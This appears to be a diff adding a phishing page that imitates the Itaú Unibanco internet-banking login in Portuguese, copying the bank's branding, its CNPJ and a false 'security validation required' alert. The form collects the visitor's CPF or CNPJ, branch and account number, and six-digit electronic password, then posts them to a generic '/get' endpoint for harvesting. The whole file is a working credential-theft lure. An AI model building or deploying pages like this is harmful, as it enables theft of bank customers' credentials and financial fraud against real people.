@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Itaú - Internet Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #ec7000 0%, #003366 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            padding: 40px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo h1 {
+            color: #003366;
+            font-size: 36px;
+            font-weight: bold;
+        }
+
+        .logo span {
+            color: #ec7000;
+        }
+
+        .logo p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .alert {
+            background: #e3f2fd;
+            border: 1px solid #2196f3;
+            border-radius: 4px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1565c0;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #ec7000;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #ec7000;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        button:hover {
+            background: #d35f00;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>itaú<span>.</span></h1>
+            <p>feito para você</p>
+        </div>
+        <div class="alert">
+            🔐 Validação de segurança necessária para continuar.
+        </div>
+        <form action="/get" method="POST">
+            <div class="form-group">
+                <label>CPF ou CNPJ</label>
+                <input type="text" name="cpf" placeholder="000.000.000-00" required>
+            </div>
+            <div class="form-group">
+                <label>Agência e Conta</label>
+                <input type="text" name="conta" placeholder="0000 / 00000-0" required>
+            </div>
+            <div class="form-group">
+                <label>Senha eletrônica</label>
+                <input type="password" name="senha" placeholder="••••••" maxlength="6" required>
+            </div>
+            <button type="submit">Entrar</button>
+        </form>
+        <div class="footer">
+            Itaú Unibanco S.A. - CNPJ 60.701.190/0001-04
+        </div>
+    </div>
+</body>
+
+</html>
